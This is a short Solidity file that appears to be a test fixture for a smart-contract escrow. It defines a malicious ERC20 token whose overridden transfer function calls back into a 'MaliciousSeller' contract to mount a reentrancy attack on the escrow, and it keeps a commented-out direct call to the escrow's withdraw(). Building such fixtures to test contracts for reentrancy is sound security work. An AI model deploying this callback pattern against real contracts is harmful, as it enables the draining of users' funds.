// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/MaliciousSeller.sol";

contract MaliciousERCTwenty is ERC20 {

    bool private _isAttacking = true;
    // to prevent recursive transfer;
    address public escrowAddress;

    MaliciousSeller private _maliciousAttackerAddress;

    constructor(address _escrowAddress) ERC20("MALICIOUS","MALC"){
        escrowAddress = _escrowAddress;
    }

    function setMaliciousAddress(address target) external {
        _maliciousAttackerAddress = MaliciousSeller(target);
    }

    function _startAttacking() internal {
        _isAttacking = true;
    }
    function _stopAttacking() internal {
        _isAttacking=false;
    }
    event Logger(string message);
    
    mapping(address=>uint256) _balances;

    function mint(address account, uint256 amount) public{
        _mint(account, amount);
    }
    
    
    //malicious transfer
   function transfer(address recipient, uint256 amount) public override returns (bool){
        super.transfer(recipient,amount);
        //Decrement balance of msg.sender
        if(_isAttacking && recipient == address(_maliciousAttackerAddress)){
           _stopAttacking();

        //    (bool success, ) = escrowAddress.call(abi.encodeWithSignature("withdraw()"));
        //    if(success){
        //     emit Logger("attack successful");
        //     }
        //     else{
        //         emit Logger("attack unsuccessful");
        //     }
           bool success = _maliciousAttackerAddress.maliciousCall();
           if (success){
            emit Logger("malicious token call successful");
           }
           else{
            emit Logger("malicious token call unsuccessful");
           }
        }


        //increase blaance of recipient
        

        return true;
   }
   
}